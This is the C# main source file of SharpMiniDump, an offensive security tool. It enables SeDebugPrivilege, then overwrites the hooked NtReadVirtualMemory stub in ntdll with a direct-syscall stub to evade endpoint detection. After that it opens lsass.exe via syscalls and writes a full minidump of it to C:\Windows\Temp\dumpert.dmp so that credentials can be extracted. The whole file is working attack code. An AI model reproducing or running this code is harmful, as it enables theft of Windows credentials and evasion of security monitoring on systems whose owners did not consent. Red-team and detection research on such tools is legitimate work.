//
// Author: B4rtik (@b4rtik)
// Project: SharpMiniDump (https://github.com/b4rtik/SharpMiniDump)
// License: BSD 3-Clause
//

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpMiniDump
{
    class Program
    {
        static void Main(string[] args)
        {

            if (IntPtr.Size != 8)
            {
                return;
            }

            if (!IsElevated())
            {
                Console.WriteLine("Run in High integrity context");
                return;
            }

            SetDebugPrivilege();

            Natives.WIN_VER_INFO pWinVerInfo = new Natives.WIN_VER_INFO();

            Natives.OSVERSIONINFOEXW osInfo = new Natives.OSVERSIONINFOEXW();
            osInfo.dwOSVersionInfoSize = Marshal.SizeOf(osInfo);

            IntPtr ntdll = Natives.LoadLibraryA("ntdll.dll");
            IntPtr proc = Natives.GetProcAddress(ntdll, "RtlGetVersion");

            NativeSysCall.Delegates.RtlGetVersion RtlGetVersion = (NativeSysCall.Delegates.RtlGetVersion)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.RtlGetVersion));

            RtlGetVersion(ref osInfo);

            pWinVerInfo.chOSMajorMinor = osInfo.dwMajorVersion + "." + osInfo.dwMinorVersion;

            Console.WriteLine("[*] OS MajorMinor version : " + pWinVerInfo.chOSMajorMinor);
            if(!pWinVerInfo.chOSMajorMinor.Equals("10.0"))
            {
                Console.WriteLine("[x] Windows 10 - Windows Server 2016 only");
                return;
            }

            pWinVerInfo.SystemCall = 0x3F;

            proc = Natives.GetProcAddress(ntdll, "RtlInitUnicodeString");

            NativeSysCall.Delegates.RtlInitUnicodeString RtlInitUnicodeString = (NativeSysCall.Delegates.RtlInitUnicodeString)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.RtlInitUnicodeString));
            RtlInitUnicodeString(ref pWinVerInfo.ProcName, @"lsass.exe");
            pWinVerInfo.hTargetPID = (IntPtr)Process.GetProcessesByName("lsass")[0].Id;

            pWinVerInfo.lpApiCall = "NtReadVirtualMemory";

            if (!UnHookNativeApi(pWinVerInfo))
            {
                Console.WriteLine("[x] error unhooking {0}", pWinVerInfo.lpApiCall);
                return;
            }

            Natives.CLIENT_ID clientid = new Natives.CLIENT_ID();
            clientid.UniqueProcess = pWinVerInfo.hTargetPID;
            clientid.UniqueThread = IntPtr.Zero;

            IntPtr hProcess = IntPtr.Zero;

            Natives.OBJECT_ATTRIBUTES objAttribute = new Natives.OBJECT_ATTRIBUTES();
            // objAttribute.ObjectName = null;

            var status = NativeSysCall.ZwOpenProcess10(ref hProcess, Natives.ProcessAccessFlags.All, objAttribute, ref clientid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error ZwOpenProcess10  " + status);
                return;
            }

            Natives.UNICODE_STRING uFileName = new Natives.UNICODE_STRING();
            RtlInitUnicodeString(ref uFileName, @"\??\C:\Windows\Temp\dumpert.dmp");

            Microsoft.Win32.SafeHandles.SafeFileHandle hDmpFile;
            IntPtr hElm = IntPtr.Zero;
            Natives.IO_STATUS_BLOCK IoStatusBlock = new Natives.IO_STATUS_BLOCK();

            IntPtr objectName = Marshal.AllocHGlobal(Marshal.SizeOf(uFileName));
            Marshal.StructureToPtr(uFileName, objectName, true);

            Natives.OBJECT_ATTRIBUTES FileObjectAttributes = new Natives.OBJECT_ATTRIBUTES
            {
                ObjectName = objectName,
                Attributes = 0x00000040,
                Length = (ulong)Marshal.SizeOf(typeof(Natives.OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };

            Natives.LARGE_INTEGER lint = new Natives.LARGE_INTEGER();
            lint.HighPart = 0;
            lint.LowPart = 0;

            long allocationsize = 0;

            status = NativeSysCall.NtCreateFile10(
                out hDmpFile,
                (int)Natives.FILE_GENERIC_WRITE,
                ref FileObjectAttributes,
                out IoStatusBlock,
                ref allocationsize,
                Natives.FILE_ATTRIBUTE_NORMAL,
                System.IO.FileShare.Write,
                Natives.FILE_OVERWRITE_IF,
                Natives.FILE_SYNCHRONOUS_IO_NONALERT,
                hElm, 0);

            if (hDmpFile.IsInvalid)
            {
                Console.WriteLine("[x] Error NtCreateFile10  " + status + " " + IoStatusBlock.status);
                NativeSysCall.ZwClose10(hProcess);
                return;
            }

            IntPtr Dbghelp = Natives.LoadLibraryA("Dbghelp.dll");
            proc = Natives.GetProcAddress(Dbghelp, "MiniDumpWriteDump");

            NativeSysCall.Delegates.MiniDumpWriteDump MiniDumpWriteDump = (NativeSysCall.Delegates.MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.MiniDumpWriteDump));

            IntPtr ExceptionParam = IntPtr.Zero;
            IntPtr UserStreamParam = IntPtr.Zero;
            IntPtr CallbackParam = IntPtr.Zero;

            Console.WriteLine("[*] Target PID " + pWinVerInfo.hTargetPID);
            Console.WriteLine("[*] Generating minidump.... " + pWinVerInfo.hTargetPID);

            if (!MiniDumpWriteDump(hProcess, (uint)pWinVerInfo.hTargetPID, hDmpFile, 2, ExceptionParam, UserStreamParam, CallbackParam))
            {
                Console.WriteLine("[x] Error MiniDumpWriteDump  ");
                NativeSysCall.ZwClose10(hProcess);
                return;
            }

            hDmpFile.Dispose();
            NativeSysCall.ZwClose10(hProcess);

            Console.WriteLine("[*] End ");
            Console.WriteLine("[*] Minidump generated in  " + Marshal.PtrToStringUni(uFileName.Buffer).Substring(4));
        }

        private static bool UnHookNativeApi(Natives.WIN_VER_INFO pWinVerInfo)
        {
            byte[] AssemblyBytes = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF };
            AssemblyBytes[4] = (byte)pWinVerInfo.SystemCall;

            IntPtr ntdll = Natives.LoadLibraryA("ntdll.dll");
            IntPtr proc = Natives.GetProcAddress(ntdll, pWinVerInfo.lpApiCall);

            IntPtr lpBaseAddress = proc;
            uint OldProtection = 0;
            uint NewProtection = 0;
            uint uSize = 10;
            var status = NativeSysCall.ZwProtectVirtualMemory10(Process.GetCurrentProcess().Handle, ref lpBaseAddress, ref uSize, 0x40, ref OldProtection);
            if (status != Natives.NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error ZwProtectVirtualMemory10 1 " + status);
                return false;
            }

            IntPtr written = IntPtr.Zero;
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(AssemblyBytes.Length);
            Marshal.Copy(AssemblyBytes, 0, unmanagedPointer, AssemblyBytes.Length);

            status = NativeSysCall.ZwWriteVirtualMemory10(Process.GetCurrentProcess().Handle, ref proc, unmanagedPointer, (uint)AssemblyBytes.Length, ref written);
            if (status != Natives.NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error ZwWriteVirtualMemory10 " + status);
                return false;
            }

            status = NativeSysCall.ZwProtectVirtualMemory10(Process.GetCurrentProcess().Handle, ref lpBaseAddress, ref uSize, OldProtection, ref NewProtection);
            if (status != Natives.NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error ZwProtectVirtualMemory10 2" + status);
                return false;
            }

            Marshal.FreeHGlobal(unmanagedPointer);

            return true;
        }

        private static bool IsElevated()
        {
            return TokenIsElevated(GetCurrentProcessToken());
        }

        private static IntPtr GetCurrentProcessToken()
        {
            //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
            IntPtr currentProcessToken = new IntPtr();
            if (!Natives.OpenProcessToken(Process.GetCurrentProcess().Handle, Natives.TOKEN_ALL_ACCESS, out currentProcessToken))
            {
                Console.WriteLine("Error OpenProcessToken " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            return currentProcessToken;
        }

        private static bool TokenIsElevated(IntPtr hToken)
        {
            //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(UInt32));
            IntPtr tokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UInt32)));
            UInt32 returnLength;

            Boolean result = Natives.GetTokenInformation(
                hToken,
                Natives.TOKEN_INFORMATION_CLASS.TokenElevationType,
                tokenInformation,
                tokenInformationLength,
                out returnLength
            );

            switch ((Natives.TOKEN_ELEVATION_TYPE)Marshal.ReadInt32(tokenInformation))
            {
                case Natives.TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault:
                    return false;
                case Natives.TOKEN_ELEVATION_TYPE.TokenElevationTypeFull:
                    return true;
                case Natives.TOKEN_ELEVATION_TYPE.TokenElevationTypeLimited:
                    return false;
                default:
                    return true;
            }
        }

        public static bool SetDebugPrivilege()
        {
            //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
            string Privilege = "SeDebugPrivilege";
            IntPtr hToken = GetCurrentProcessToken();
            Natives.LUID luid = new Natives.LUID();
            if (!Natives.LookupPrivilegeValue(null, Privilege, ref luid))
            {
                Console.WriteLine("Error LookupPrivilegeValue" + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            Natives.LUID_AND_ATTRIBUTES luidAndAttributes = new Natives.LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Natives.SE_PRIVILEGE_ENABLED;

            Natives.TOKEN_PRIVILEGES newState = new Natives.TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Natives.TOKEN_PRIVILEGES previousState = new Natives.TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            if (!Natives.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                Console.WriteLine("AdjustTokenPrivileges() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            return true;
        }

    }
}
